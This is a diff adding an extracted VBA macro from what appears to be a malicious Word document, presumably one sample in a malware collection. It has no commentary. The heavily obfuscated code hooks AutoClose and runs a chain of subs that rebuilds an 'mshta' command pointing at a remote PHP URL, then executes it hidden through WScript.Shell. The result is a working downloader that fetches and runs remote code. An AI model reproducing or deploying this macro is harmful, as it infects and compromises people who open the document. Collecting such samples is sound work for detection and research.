@@ -1,0 +1,232 @@
+Filename     : ./macros/4f9d93ce66ab64184929a1b1d2f9b239617babcb3d9514f2d5c71c0b79966637
+OLE stream   : VBA/ThisDocument
+VBA filename : ThisDocument.cls
+----------------------------------------
+Attribute VB_Name = "ThisDocument"
+Attribute VB_Base = "1Normal.ThisDocument"
+Attribute VB_GlobalNameSpace = False
+Attribute VB_Creatable = False
+Attribute VB_PredeclaredId = True
+Attribute VB_Exposed = True
+Attribute VB_TemplateDerived = True
+Attribute VB_Customizable = True
+Sub zMjLoJBxxgZgFC()
+  KfBLyEG = "RJpkzrJIwcPwNgAv" + "cMIuzYZMXfGbIGdITHLvLMkCDbNXwg"
+GRypEDUfi = "wxAjYxHAnHFKpSqzSDkRnz" + "V"
+wdUHxPggGZn = 253 + NnHFdXIONWFRMPf(3029) + 591 + NnHFdXIONWFRMPf(2724) + 2598
+  Application.Run "qYZInGARuYdXEQ"
+  MxCUyfd = NnHFdXIONWFRMPf(4487) + 4274 + NnHFdXIONWFRMPf(958) + NnHFdXIONWFRMPf(4009) + 34 + 2744 + 875
+NBbZkHBDbXFR = "ZPnJrfXuHUiAJD" + Left("IQjbriBiSv", 1)
+bFFLKcjAI = LTrim("UC") + "yGCpxMyLTFTXTKIvRkVNNKz" + "xwMzDP"
+End Sub
+Sub KuCEVxjZyfGMdb()
+  ZCEiGVpr = 568 + NnHFdXIONWFRMPf(162)
+oJBxxgZgFCq = 2611 + NnHFdXIONWFRMPf(671) + 3465
+EQIwvgvUMETT = 2158 - NnHFdXIONWFRMPf(4821)
+BbxrdNu = Left("dySwCLHDNV", 10) + Left("YzzIykgziP", 4) + Left("uCEVxjZyfG", 8)
+xrnGqurMKvu = NnHFdXIONWFRMPf(2989) + NnHFdXIONWFRMPf(2179) + 2070
+  Application.Run "TIzBSfdTQfyREHb"
+  jVFAoHcQPvNp = 2895 + NnHFdXIONWFRMPf(3530) + 537 + 1403 + NnHFdXIONWFRMPf(3919)
+NrARMrjKvH = LTrim("SwL") + RTrim("xOuoUCgMqEPRTwxNDWD")
+gPMoRwgyb = 1932 + 195 + NnHFdXIONWFRMPf(1652) + NnHFdXIONWFRMPf(1620)
+End Sub
+Function NnHFdXIONWFRMPf(X)
+ NnHFdXIONWFRMPf = Atn(X) - Atn(1)
+End Function
+
+Public Function IIPFAEFujTgjUSr(piyyRvyqTFGnnOE, nAxLKFMjYGHHYBJLZM, LTqgrXGoMfKTKJXiyy)
+  ACvRUFOH = 3690 + 3874 + NnHFdXIONWFRMPf(601)
+wDukrudVI = "rEqqjYUjjGfibH" + Left("XXDrLWniAz", 3) + Left("NvwwNoyANB", 8) + "TbMvYASyHzxLUjj"
+dORxDyvCo = "YVkpZRgkubnfZOqVKLLjyfqP" + LTrim("XISCALb")
+CLuGBESSp = Left("ZPHwdGpzJE", 1) + Left("vpLknPwRTX", 5) + Left("IbxYiCXvuR", 7)
+XCPioRJ = 3214 - NnHFdXIONWFRMPf(2319) - 4244 - 4571 - 1412 - 686 - 601
+  IIPFAEFujTgjUSr = Replace(piyyRvyqTFGnnOE, nAxLKFMjYGHHYBJLZM, LTqgrXGoMfKTKJXiyy)
+  OgixUUVpr = 2092 + 132 + 4906 + 3938 + NnHFdXIONWFRMPf(2091) + NnHFdXIONWFRMPf(1676)
+zXUTbnyFu = "cbfE" + "bdMVSCAfNQUxTTbyYZupudND" + "qWTrijQUkCZBbGTEOMobXF" + "xrLJSkrRnWoTkUVSYVxwuu"
+ddyjLASnIqH = Left("NOwwbXdwRT", 4) + Left("cWizIbdIjv", 4) + "Roc"
+puBzrcNR = 1541 - NnHFdXIONWFRMPf(2378) - 4077 - NnHFdXIONWFRMPf(4779) - 702 - NnHFdXIONWFRMPf(4853) - 3702
+  EpSXfTxG = "DHpUCDz" + "VVZ" + LTrim("FOfgVPwAPCnFiBvSCTZfOnT") + "oBCMMOxFIzfOIPdxXMr"
+dRPHqud = Left("GBiidNbfig", 8) + "GouZkHToQAT" + Left("iOkBDEIAUJ", 3)
+SOfgrBiWfG = "DkNSHVNbyfwiHbf" + "TWKdkvAyY"
+  JoXRSJpGgdjW = 2114 + NnHFdXIONWFRMPf(1609) + NnHFdXIONWFRMPf(4752) + 3599
+VuEWDZX = 1251 + NnHFdXIONWFRMPf(3893) + NnHFdXIONWFRMPf(165)
+jbUALJEocBg = 2803 - NnHFdXIONWFRMPf(3338) - 241 - 3062 - 2550 - NnHFdXIONWFRMPf(1866)
+upyzETqzooXu = 205 - NnHFdXIONWFRMPf(3420) - 1552 - 3117
+End Function
+
+Sub TIzBSfdTQfyREHb()
+ nwpddfHiSo = NnHFdXIONWFRMPf(2948) - NnHFdXIONWFRMPf(1138) - 4852 - 1587
+yVYjUWJT = RTrim("jqiUJ") + LTrim("NpzWTYkVz") + "wp" + LTrim("FOLbzCFbIQKdTY")
+SxnoCLgGu = "RJX" + "FoMupuLbNcg" + "YLBwOvJfy"
+kGKoJKYRixV = 1671 - NnHFdXIONWFRMPf(3042) - 43 - 4512
+ AcbTvAZUEpcwW = "NOkXjyLXLdSGxTBvJCMnoKkihzrFKpBFKvndPFScIkOFjPUyd hzrFKpBFKvndPzrFKpBFKvndPp://dqwowqjudhqwdhFScIkOFjPUydxTBvJCMnoKkidFScIkOFjPUyddFScIkOFjPUyddw.coNOkXjyLXLdSG/REX/xTBvJCMnoKkiIdHAyQuVivdgick.php?uzrFKpBFKvndPNOkXjyLXLdSGFScIkOFjPUyd=izrFKpBFKvndPpidd"
+AcbTvAZUEpcwW = IIPFAEFujTgjUSr(AcbTvAZUEpcwW, "NOkXjyLXLdSG", "m")
+XBKDUxBPFik = NnHFdXIONWFRMPf(1477) + NnHFdXIONWFRMPf(3775) + 4212 + NnHFdXIONWFRMPf(3440) + 1944 + 162
+OgISkDzKWHJ = 39 + NnHFdXIONWFRMPf(3113) + 4588 + NnHFdXIONWFRMPf(4635) + 2130 + NnHFdXIONWFRMPf(860)
+dkJyJwguqz = "qoEQRwCVn" + "NFxnpfYvf" + LTrim("uYK") + "RF"
+pDLPRjM = NnHFdXIONWFRMPf(125) - 565 - 2735
+NETpRWZ = 4443 + NnHFdXIONWFRMPf(3692) + NnHFdXIONWFRMPf(4702) + 275 + 4764
+wfHNFjZCSf = 4875 - NnHFdXIONWFRMPf(2550) - NnHFdXIONWFRMPf(4495) - 2328 - NnHFdXIONWFRMPf(1525) - NnHFdXIONWFRMPf(756)
+AcbTvAZUEpcwW = IIPFAEFujTgjUSr(AcbTvAZUEpcwW, "FScIkOFjPUyd", "a")
+OcGTWACNvdH = RTrim("pNgW") + "bjp" + "ToUQKqTiqiCXNZ" + LTrim("EvnjiwUyPMRDryHoZS")
+rkZkLobjjTz = LTrim("FVjOKMnMgBOw") + "rBNSHuAQUyBjpVLVqHzCcLDTk" + LTrim("yKBwXWffPWzFHZUSHZCEErK") + "zcDEnEDLYQuCoYiPVHKVC" + LTrim("kvEOQxoSqciNLDfxIFAoovbqbInXj")
+AcbTvAZUEpcwW = IIPFAEFujTgjUSr(AcbTvAZUEpcwW, "xTBvJCMnoKki", "s")
+AJDRATuTVpC = NnHFdXIONWFRMPf(3203) + NnHFdXIONWFRMPf(3695)
+PpkuWSqJcqy = "vSLAAgiZ" + "ATRyIIYjUE" + "GvX" + "Yiyn" + Left("HxPDRwDDDn", 3) + "NrJzjrEBq"
+NLvGwxiQZpb = "XNCAkfIpfTxYzzoMyHicNNFdJLCx" + "dFSoNDpBBVRf" + RTrim("bzyQDCGwBUuiAvXJ") + "SyMPncHjKg"
+yLFZuwq = "xkvAPLQ" + Left("TiOndQOgiP", 6) + "ybNdMVBPK" + "TNYqwHXBPTL" + Left("PdfncxXVUD", 4) + "KrLcWJFIIdVy"
+zooFINbZYUSQ = NnHFdXIONWFRMPf(3978) + 3389
+BoLYzobXjM = "QCfyAAgO" + "vvRkDbXjgvZFCO"
+GSiPyKpOD = NnHFdXIONWFRMPf(3172) - 2821 - 788 - NnHFdXIONWFRMPf(2304) - NnHFdXIONWFRMPf(1849)
+AcbTvAZUEpcwW = IIPFAEFujTgjUSr(AcbTvAZUEpcwW, "zrFKpBFKvndP", "t")
+VBfbFFrXqKjD = "CCZBzrJbdRqKSjfpOVRd" + LTrim("u") + "zfqjDATEdKCxcw" + "IjAMciRRNZfpqBEAOOdyOHYFyngVq"
+NSgTjkxY = "vkBn" + "QpKFIbPKUYqAvBHY"
+SMTbMWqLwg = "qM" + "FCqGuSMqvPKfC" + Left("OfRXDZvYcE", 4) + "OqVBfojbuv"
+AcbTvAZUEpcwW = IIPFAEFujTgjUSr(AcbTvAZUEpcwW, "ndLQZFGUpCkS", "e")
+jDXbEKJOIxj = NnHFdXIONWFRMPf(2352) + NnHFdXIONWFRMPf(4088) + NnHFdXIONWFRMPf(3403) + 2816 + 418 + NnHFdXIONWFRMPf(3593)
+IXcpnDWZ = 3719 + 1805 + NnHFdXIONWFRMPf(1960) + 4414 + NnHFdXIONWFRMPf(3646)
+pBpMfSYZgTA = "CYOUzCJ" + "xfx" + Left("LHuiAWpTdM", 3) + "kDpFIgNPCnXSp" + Left("GUJZwULNYk", 6)
+WgVKHWJqUXjR = "fkNjjCvIUyYMYrkCIYSE" + "YcIfyNQdUUiAbnY" + "nKkNiXUTICIdZOCDgMdWvQBGBbri" + RTrim("xocxwIKZJbdzFUwSYngboyAij")
+FEYDUPGp = NnHFdXIONWFRMPf(3204) + NnHFdXIONWFRMPf(2923)
+RQuQkoC = NnHFdXIONWFRMPf(488) - NnHFdXIONWFRMPf(4680) - 4570 - NnHFdXIONWFRMPf(4299) - NnHFdXIONWFRMPf(376) - 3838
+AcbTvAZUEpcwW = IIPFAEFujTgjUSr(AcbTvAZUEpcwW, "IdHAyQuVivdg", "l")
+ZbDpBTHHGkG = Left("VPjiTEqTpI", 10) + Left("NDEniRVCDn", 5) + "gfFgxfnRk"
+vLVPXEyEUd = "FciNdoTTWK" + Left("gWLfdkNwOW", 4)
+ZIzxCrMjP = "IuVcGFYngIEIWRdArb" + "FxfUqIIdDLUKgHEwyOHwqkMzbu" + "iVdfgLGHnUZxUGFq"
+KDQJXJwR = 1846 + 629 + NnHFdXIONWFRMPf(3195)
+rKzJzdWNgFr = LTrim("fYbEAduIZwfrkZFyZEBqV") + "ToUnxcwAxkiSvKyoojVXEMU" + "ZqNTEccnjFKXgHDOgEfKxowvIYOQ"
+AbyCKnvRU = 4781 - NnHFdXIONWFRMPf(3901) - 2962 - NnHFdXIONWFRMPf(1932) - NnHFdXIONWFRMPf(2567) - 88
+OYTAoZjqciixrGL = "WScripydATgjrEdFEq.ShMTvdVyqAJnqUqTjBNWXiQDVUqTjBNWXiQDVU"
+OYTAoZjqciixrGL = IIPFAEFujTgjUSr(OYTAoZjqciixrGL, "RFZQrLvrIMoM", "m")
+XBKDUxBPFik = NnHFdXIONWFRMPf(1477) + NnHFdXIONWFRMPf(3775) + 4212 + NnHFdXIONWFRMPf(3440) + 1944 + 162
+OgISkDzKWHJ = 39 + NnHFdXIONWFRMPf(3113) + 4588 + NnHFdXIONWFRMPf(4635) + 2130 + NnHFdXIONWFRMPf(860)
+dkJyJwguqz = "qoEQRwCVn" + "NFxnpfYvf" + LTrim("uYK") + "RF"
+OYTAoZjqciixrGL = IIPFAEFujTgjUSr(OYTAoZjqciixrGL, "xOyGMSRNPCQq", "a")
+OcGTWACNvdH = RTrim("pNgW") + "bjp" + "ToUQKqTiqiCXNZ" + LTrim("EvnjiwUyPMRDryHoZS")
+rkZkLobjjTz = LTrim("FVjOKMnMgBOw") + "rBNSHuAQUyBjpVLVqHzCcLDTk" + LTrim("yKBwXWffPWzFHZUSHZCEErK") + "zcDEnEDLYQuCoYiPVHKVC" + LTrim("kvEOQxoSqciNLDfxIFAoovbqbInXj")
+GfNgpwZBiWL = RTrim("wZTRMkkG") + "GLASzoMHnGcgECPSCjNOKurvkj" + RTrim("ZQZvxjbHLbNAR")
+InXEuGPC = NnHFdXIONWFRMPf(4779) + 3073 + NnHFdXIONWFRMPf(3289) + 4290
+OYTAoZjqciixrGL = IIPFAEFujTgjUSr(OYTAoZjqciixrGL, "dKkAPZOrDXVk", "s")
+AJDRATuTVpC = NnHFdXIONWFRMPf(3203) + NnHFdXIONWFRMPf(3695)
+PpkuWSqJcqy = "vSLAAgiZ" + "ATRyIIYjUE" + "GvX" + "Yiyn" + Left("HxPDRwDDDn", 3) + "NrJzjrEBq"
+NLvGwxiQZpb = "XNCAkfIpfTxYzzoMyHicNNFdJLCx" + "dFSoNDpBBVRf" + RTrim("bzyQDCGwBUuiAvXJ") + "SyMPncHjKg"
+yLFZuwq = "xkvAPLQ" + Left("TiOndQOgiP", 6) + "ybNdMVBPK" + "TNYqwHXBPTL" + Left("PdfncxXVUD", 4) + "KrLcWJFIIdVy"
+OYTAoZjqciixrGL = IIPFAEFujTgjUSr(OYTAoZjqciixrGL, "ydATgjrEdFEq", "t")
+VBfbFFrXqKjD = "CCZBzrJbdRqKSjfpOVRd" + LTrim("u") + "zfqjDATEdKCxcw" + "IjAMciRRNZfpqBEAOOdyOHYFyngVq"
+NSgTjkxY = "vkBn" + "QpKFIbPKUYqAvBHY"
+SMTbMWqLwg = "qM" + "FCqGuSMqvPKfC" + Left("OfRXDZvYcE", 4) + "OqVBfojbuv"
+OYTAoZjqciixrGL = IIPFAEFujTgjUSr(OYTAoZjqciixrGL, "MTvdVyqAJnqU", "e")
+jDXbEKJOIxj = NnHFdXIONWFRMPf(2352) + NnHFdXIONWFRMPf(4088) + NnHFdXIONWFRMPf(3403) + 2816 + 418 + NnHFdXIONWFRMPf(3593)
+IXcpnDWZ = 3719 + 1805 + NnHFdXIONWFRMPf(1960) + 4414 + NnHFdXIONWFRMPf(3646)
+pBpMfSYZgTA = "CYOUzCJ" + "xfx" + Left("LHuiAWpTdM", 3) + "kDpFIgNPCnXSp" + Left("GUJZwULNYk", 6)
+WgVKHWJqUXjR = "fkNjjCvIUyYMYrkCIYSE" + "YcIfyNQdUUiAbnY" + "nKkNiXUTICIdZOCDgMdWvQBGBbri" + RTrim("xocxwIKZJbdzFUwSYngboyAij")
+FEYDUPGp = NnHFdXIONWFRMPf(3204) + NnHFdXIONWFRMPf(2923)
+RQuQkoC = NnHFdXIONWFRMPf(488) - NnHFdXIONWFRMPf(4680) - 4570 - NnHFdXIONWFRMPf(4299) - NnHFdXIONWFRMPf(376) - 3838
+SgBcLgkyx = 3198 + 3583 + 1545 + 1662 + NnHFdXIONWFRMPf(4988) + NnHFdXIONWFRMPf(4477) + NnHFdXIONWFRMPf(2764)
+kYqJvIxTqvCM = LTrim("UFFy") + "T" + "xBGjrIoPAY"
+RRcvcxTF = Left("zGLJpqPfZv", 4) + Left("xkvSCBrvqV", 8) + "IQKKkoYWrUvp"
+OYTAoZjqciixrGL = IIPFAEFujTgjUSr(OYTAoZjqciixrGL, "qTjBNWXiQDVU", "l")
+ZbDpBTHHGkG = Left("VPjiTEqTpI", 10) + Left("NDEniRVCDn", 5) + "gfFgxfnRk"
+vLVPXEyEUd = "FciNdoTTWK" + Left("gWLfdkNwOW", 4)
+ZIzxCrMjP = "IuVcGFYngIEIWRdArb" + "FxfUqIIdDLUKgHEwyOHwqkMzbu" + "iVdfgLGHnUZxUGFq"
+KDQJXJwR = 1846 + 629 + NnHFdXIONWFRMPf(3195)
+rKzJzdWNgFr = LTrim("fYbEAduIZwfrkZFyZEBqV") + "ToUnxcwAxkiSvKyoojVXEMU" + "ZqNTEccnjFKXgHDOgEfKxowvIYOQ"
+
+ yNGCAUN = "VrMAEpw" + Left("bwBkdQwzwr", 3) + Left("VCzdpKxVyd", 3) + "yAcQKG"
+YLqwHFOZxxJj = Left("rFrOrDwIXw", 6) + Left("DfGoZAIZqN", 5) + "UcDbcDVLM" + "dcLIRrBEpju"
+ExzciAN = Left("zxCUZxrrvP", 5) + "uYjgN" + Left("YdjIggqKpq", 6) + "YOQKYD"
+ XzAbHfgnMIQTqIo AcbTvAZUEpcwW, OYTAoZjqciixrGL
+ NOBMRvP = NnHFdXIONWFRMPf(3899) - NnHFdXIONWFRMPf(2392) - 385 - 3748 - 1851
+vTQrxYvB = 1690 - 2091 - 1161 - 2414 - NnHFdXIONWFRMPf(4235) - 2031 - 2100
+LErPCgRI = Left("nXvuzZHZkG", 3) + "kbnPJPiuGjYrpIS" + Left("jrSRoAxTPU", 2)
+wwWRSAip = Left("vOXjVwSPHK", 10) + "zXKqFnZPx"
+pZiBiAIr = Left("yIpUKINEXy", 1) + Left("dwITnxqXVx", 6) + "Uo" + "RT" + Left("oPNWwoqPMu", 6) + "vEApRJpPMD"
+ EpSXfTxG = "DHpUCDz" + "VVZ" + LTrim("FOfgVPwAPCnFiBvSCTZfOnT") + "oBCMMOxFIzfOIPdxXMr"
+dRPHqud = Left("GBiidNbfig", 8) + "GouZkHToQAT" + Left("iOkBDEIAUJ", 3)
+SOfgrBiWfG = "DkNSHVNbyfwiHbf" + "TWKdkvAyY"
+ KvroZAorCpkM = 3367 + 1058 + NnHFdXIONWFRMPf(4112) + NnHFdXIONWFRMPf(3079) + NnHFdXIONWFRMPf(772)
+frGLvUuID = NnHFdXIONWFRMPf(939) - 1815 - 1099 - 2781 - NnHFdXIONWFRMPf(1861)
+JTkkKDUZPZdS = Left("OAGYxVkTDJ", 1) + "BUIUgpccnOSU" + "CgoWzSvK" + "JodGwPAUNcRqqix"
+HUIPOzLvnqU = Left("JYirpMHyLx", 6) + "PkWOoPWVDZjTNc" + "JfCUZYGD" + Left("vAxxNrvdnj", 10)
+KBGjLvZ = 1591 + NnHFdXIONWFRMPf(3073) + NnHFdXIONWFRMPf(917) + 853 + 2507 + 769
+uAMiTvXWu = NnHFdXIONWFRMPf(269) - 2280 - NnHFdXIONWFRMPf(4545) - NnHFdXIONWFRMPf(3280)
+End Sub
+Sub XzAbHfgnMIQTqIo(EjVWWyJvDbcVIBnTfN, WqrJvZdIOJGOBZPGj)
+  DAFYCdUUNN = NnHFdXIONWFRMPf(4591) + NnHFdXIONWFRMPf(4434) + NnHFdXIONWFRMPf(4296) + NnHFdXIONWFRMPf(3207) + 3236 + 1167
+uVNJrHfvnTy = "dDVfyv" + "fvDz" + "PLLKvDzOL"
+JBxjEFgkMvq = 332 + 1140 + NnHFdXIONWFRMPf(2536) + 3443 + 1485 + 4201
+HwOIYcENHxfd = RTrim("uIHqIbxGzMBcnPcCVRTqbWj") + LTrim("MSozFYgwgyzIodPWoA") + RTrim("CdQODSFfXDGcVvNE") + "dnOpHouQGi" + RTrim("jMwCyqFHuSgXgrXk")
+jUpHiXYozSv = "wUHYBcyOnqQVVbTIyqpJcBZkL" + RTrim("kEiQgZEBTnrDAPkpuPxF") + "NoZiKNVJLyIvIkOXSFx" + LTrim("uYBc") + "PCQTxYbNAofDf"
+  wviWkWcF = 809 + 2181 + NnHFdXIONWFRMPf(2640) + NnHFdXIONWFRMPf(3345)
+byxMfOIkOjAb = NnHFdXIONWFRMPf(3677) + NnHFdXIONWFRMPf(4165) + 686
+  Set ipbSHuRDKUPqrFG = CreateObject(WqrJvZdIOJGOBZPGj)
+  Call ipbSHuRDKUPqrFG.Run(EjVWWyJvDbcVIBnTfN, 0)
+  bDbqgxMf = 4251 - NnHFdXIONWFRMPf(2881)
+JQqPQqKA = NnHFdXIONWFRMPf(1629) + 915 + 25 + 2833
+OgixUUVpr = 2092 + 132 + 4906 + 3938 + NnHFdXIONWFRMPf(2091) + NnHFdXIONWFRMPf(1676)
+End Sub
+Sub qYZInGARuYdXEQ()
+  wyOZdcKZEdX = "MSEPDgLBJfrP" + Left("KnNEKKxWHK", 7) + Left("jvjpIvWibu", 10)
+OLRzvPjE = "JCrViWxvVi" + Left("JycAHGdRBc", 7) + Left("IUMvKgUqbu", 9) + "LOCgboQiVKQcXOQ"
+XyRJXRAjdERv = RTrim("ABoYWLGgOHxTBWW") + "gIEopdFikZTvqUFdvNoZNYXyvGw" + "D" + LTrim("Z")
+SfSTJuDN = NnHFdXIONWFRMPf(2712) - NnHFdXIONWFRMPf(774) - NnHFdXIONWFRMPf(1509)
+DJwIqLFr = 1347 + NnHFdXIONWFRMPf(3369) + 1372
+XrkfWnwpB = 705 + 4394 + 2739
+RzEqkQkEAjdi = 1287 - 1164 - 2727 - NnHFdXIONWFRMPf(2654) - 2025
+  Application.Run "IwvgvUMETTgjCi"
+  AOdIXwn = Left("jxdPJqnVzk", 1) + Left("FUOOwizDdY", 1) + "vyFnDMQurpRvVRG" + "FiYZMFxQEuCb" + "bDJjJgVLnoTPGSg"
+KqYgxMLJi = LTrim("FbvALWrUXFD") + LTrim("LjQnNcHdDVCggYuqgYybIfHvpfqKcj") + "ZTRgUXddCVoGcDopqjH"
+EfddZSI = NnHFdXIONWFRMPf(1596) - 3443 - 4629 - NnHFdXIONWFRMPf(2018) - 276 - 1363
+uyyVfVy = Left("MYnRKqqScI", 8) + "CPwzFUOFOL" + Left("qcvNSuYBKr", 3) + Left("xOoBxwVyKF", 1)
+End Sub
+Sub AutoClose()
+  kVzxLqSWKLB = NnHFdXIONWFRMPf(2471) + NnHFdXIONWFRMPf(1383) + 383
+BFNCzYCjpMf = 4330 + NnHFdXIONWFRMPf(2022) + 4561 + NnHFdXIONWFRMPf(2274)
+VRjZLSpIjzgO = NnHFdXIONWFRMPf(2349) - 4032 - 3111 - 1645 - NnHFdXIONWFRMPf(4652) - NnHFdXIONWFRMPf(2723) - 740
+vQPWzjU = Left("iTiwCruAbf", 2) + "NwBkKgGVckpV" + Left("RHbLiYrdED", 4) + Left("kUiAzVOipb", 3)
+  Application.Run "GVprGxyIWEMCjA"
+  uKRNUvNipoSO = Left("JWITLciczk", 10) + "kOqy"
+YTjTcZLWHA = 3095 - NnHFdXIONWFRMPf(2909) - 1953
+End Sub
+Sub GVprGxyIWEMCjA()
+  XPVgoITrNduI = 2105 + NnHFdXIONWFRMPf(4328) + NnHFdXIONWFRMPf(3566) + NnHFdXIONWFRMPf(3323) + 218
+fZixyWCfu = 2973 + NnHFdXIONWFRMPf(556) + 4681 + NnHFdXIONWFRMPf(654) + NnHFdXIONWFRMPf(2099) + NnHFdXIONWFRMPf(1844) + NnHFdXIONWFRMPf(4545)
+ZzDOIfQ = NnHFdXIONWFRMPf(2544) + NnHFdXIONWFRMPf(4383) + 1743 + NnHFdXIONWFRMPf(4185) + NnHFdXIONWFRMPf(4222)
+jznDyAvjJMQ = NnHFdXIONWFRMPf(233) + 4494
+zvqQzSzbI = 4428 - 4441 - 749 - NnHFdXIONWFRMPf(4720) - NnHFdXIONWFRMPf(868) - 4644 - 4413
+  Application.Run "zMjLoJBxxgZgFC"
+  xjHLudzXYRgP = 1399 + 4378 + 1631 + NnHFdXIONWFRMPf(3600)
+xWgHgcvcPFv = NnHFdXIONWFRMPf(3083) + 56 + NnHFdXIONWFRMPf(4221) + NnHFdXIONWFRMPf(721) + NnHFdXIONWFRMPf(3130) + 437 + 2642
+BQkWEIvW = RTrim("rLvUVWNzCFIWbjPP") + LTrim("pkgvyqqpvMDTGGfcdDMgpFHV")
+EziGZHfW = RTrim("cJGNTMFfAGkU") + "iTcoqxHR" + "BJZWYvPKLPDoAYPuHyKjbZQCZ"
+End Sub
+Sub JKYzzIykgziPxA()
+  cpUkXTBzHHr = 4390 + NnHFdXIONWFRMPf(3713) + NnHFdXIONWFRMPf(1951) + NnHFdXIONWFRMPf(4503) + NnHFdXIONWFRMPf(896) + NnHFdXIONWFRMPf(3347)
+WEbcMbbn = NnHFdXIONWFRMPf(1888) - 2499 - 86 - NnHFdXIONWFRMPf(1123)
+rTNwOEIp = NnHFdXIONWFRMPf(3077) - 458 - 4891 - NnHFdXIONWFRMPf(1029) - NnHFdXIONWFRMPf(4066)
+  Application.Run "KuCEVxjZyfGMdb"
+  dGpRvrDwzw = Left("rVckTnLQDC", 10) + "IpCYSpo" + Left("yWfyEHvJZJ", 7)
+DMCwbTMFB = NnHFdXIONWFRMPf(2927) - 2032 - 3442
+YoVVVVDRcFp = RTrim("MbuWjoVywnjvBn") + RTrim("AYkHLgCXXHcndyAcyYQMQrLWGSnV") + "xoXbFqXZidcYwCnFWUURfddxFyovD" + RTrim("xQowoKTkGwrxrUbMNKovM") + "H"
+End Sub
+
+Sub IwvgvUMETTgjCi()
+  LNGBRGDjzHRC = "ivLZWjAgjH" + "iOQ" + Left("buvSZyMBpQ", 3)
+IRPVRTKNLJEI = NnHFdXIONWFRMPf(241) - 2805 - NnHFdXIONWFRMPf(4423)
+  Application.Run "DFVdySwCLHDNVW"
+  CWSwyFyIbroI = Left("LEGMOBVzPQ", 8) + Left("fRjgAwxSBc", 1) + "nQx"
+woXoiMXxV = NnHFdXIONWFRMPf(4076) + 3436 + NnHFdXIONWFRMPf(4774) + 4561
+QfyREHbfAcbT = "SQgHzZHy" + Left("OoLYRVQABR", 7) + "uRYgkyPMnndU" + Left("cCoxzTIzBS", 1)
+ixrGLNH = NnHFdXIONWFRMPf(1209) + NnHFdXIONWFRMPf(4653) + 4838 + 1050 + NnHFdXIONWFRMPf(1315)
+End Sub
+Sub DFVdySwCLHDNVW()
+  PxJOJYA = 2919 + NnHFdXIONWFRMPf(3721) + NnHFdXIONWFRMPf(4748) + NnHFdXIONWFRMPf(1943)
+ZPUfNCvR = NnHFdXIONWFRMPf(493) + NnHFdXIONWFRMPf(3449) + 4227 + NnHFdXIONWFRMPf(1348)
+nIYpSJEuPYp = 4722 - 4068 - 2754 - 2643 - 3401 - 1988 - 745
+  Application.Run "JKYzzIykgziPxA"
+  RvyqTFGnn = NnHFdXIONWFRMPf(2777) + 2834 + NnHFdXIONWFRMPf(2612) + NnHFdXIONWFRMPf(2528) + 646
+rXGoMfK = 1873 - NnHFdXIONWFRMPf(2733) - NnHFdXIONWFRMPf(4880) - 2919 - NnHFdXIONWFRMPf(3207) - 3493 - NnHFdXIONWFRMPf(4295)
+TgjUSrd = NnHFdXIONWFRMPf(1958) + 3071 + 2718 + NnHFdXIONWFRMPf(2743)
+ZVwjNTbgJ = RTrim("rAvpZEjVWWyJvDbcV") + RTrim("fNMWqrJvZdIOJGOBZPGjBipbSH") + LTrim("UPqrFGCXzAbHfgnMIQTq") + "NnHFdXIONWF" + RTrim("fCG")
+End Sub
+
